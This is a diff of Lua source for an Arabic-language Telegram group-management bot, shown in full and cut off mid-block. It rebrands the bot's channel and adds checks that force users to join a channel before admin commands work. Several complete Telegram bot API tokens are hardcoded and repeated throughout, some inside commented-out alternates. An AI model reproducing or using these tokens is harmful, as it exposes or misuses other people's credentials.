+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 function deowner_by_reply(extra, result, success)
 local hash =  'SNIEBR:'..bot_id..'owners:'..msg.chat_id_
@@ -4053,10 +4063,10 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,deowner_by_reply)
 return false
 end  
 if text and text:match("^تنزيل مدير @(.*)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local apow = {string.match(text, "^(تنزيل مدير) @(.*)$")}
 local hash =  'SNIEBR:'..bot_id..'owners:'..msg.chat_id_
@@ -4073,10 +4083,10 @@ resolve_username(apow[2],remowner_by_username)
 return false
 end  
 if text and text:match("^تنزيل مدير (%d+)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local hash =  'SNIEBR:'..bot_id..'owners:'..msg.chat_id_
 local apow = {string.match(text, "^(تنزيل مدير) (%d+)$")}
@@ -4453,10 +4463,10 @@ send(msg.chat_id_, msg.id_, 1, '❌┇تم الغاء تثبيت الرساله'
 return false
 end
 if text == ("رفع ادمن") and msg.reply_to_message_id_ then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 if not is_creator(msg) and datahmade:get('SNIEBR:'..bot_id.."SNIEBR:lock:set"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع الرفع تم تعطيل الرفع من قبل المنشئين \n', 1, 'md')
@@ -4475,10 +4485,10 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 return false
 end
 if text and text:match("^رفع ادمن @(.*)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 if not is_creator(msg) and datahmade:get('SNIEBR:'..bot_id.."SNIEBR:lock:set"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع الرفع تم تعطيل الرفع من قبل المنشئين \n', 1, 'md')
@@ -4502,19 +4512,19 @@ resolve_username(apmd[2],promote_by_username)
 return false
 end
 if text and text:match("^رفع ادمن (%d+)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 if not is_creator(msg) and datahmade:get('SNIEBR:'..bot_id.."SNIEBR:lock:set"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع الرفع تم تعطيل الرفع من قبل المنشئين \n', 1, 'md')
 return false end
 local apmd = {string.match(text, "^(رفع ادمن) (%d+)$")}
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 datahmade:sadd('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
 tsX000(apmd[2],msg,"🔖┇تم رفعة ادمن   في البوت")
@@ -4560,6 +4570,11 @@ datahmade:del('SNIEBR:'..bot_id..'mods:'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, '🗑┇ تم مسح  قائمة الادمنية  ', 1, 'md')
 end
 if text and text == "تعين الايدي" then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 send(msg.chat_id_, msg.id_, 1,  '☑┇ ارسل الان النص\n☑┇ يمكنك اضافه :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#photos` > عدد صور المستخدم\n- `#id` > ايدي المستخدم\n- `#auto` > تفاعل المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات\n- `#game` > المجوهرات', 1, 'md')
 datahmade:set("tsahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'SNIEBR')
 return "SNIEBR"
@@ -4571,10 +4586,10 @@ datahmade:del("SNIEBR:gr:id:text:"..bot_id..msg.chat_id_)
 end
 
 if text == ("الادمنيه") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local hash =   'SNIEBR:'..bot_id..'mods:'..msg.chat_id_
 local list = datahmade:smembers(hash)
@@ -4619,6 +4634,11 @@ end
 end
 
 if text and text == "تاك للكل" then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 function tag_all(t1, t2)
 local text = "👨‍👧‍👦 ┇ قائمه الاعضاء   ،\nꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ \n"
 i = 0
@@ -4660,10 +4680,10 @@ end
 bot.channel_get_admins(msg.chat_id_,cb)
 end
 if text == ("رفع الادمنيه") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local function cb(extra,result,success)
 local list = result.members_
@@ -4679,6 +4699,11 @@ end
 bot.channel_get_admins(msg.chat_id_,cb)
 end
 if (text and text == 'تفعيل اطردني') then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if not datahmade:get('SNIEBR:'..bot_id..'kickme:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '✔️┇ امر اطردني بالفعل تم تفعيلة ', 1, 'md')
 else
@@ -4687,6 +4712,11 @@ datahmade:del('SNIEBR:'..bot_id..'kickme:mute'..msg.chat_id_)
 end
 end
 if (text and text == 'تعطيل اطردني') then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if datahmade:get('SNIEBR:'..bot_id..'kickme:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '🔌┇ تم تعطيل امر اطردني بالفعل ', 1, 'md')
 else
@@ -4821,6 +4851,11 @@ end
 end
 
 if (text and text == 'تفعيل الايدي بالصوره') then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
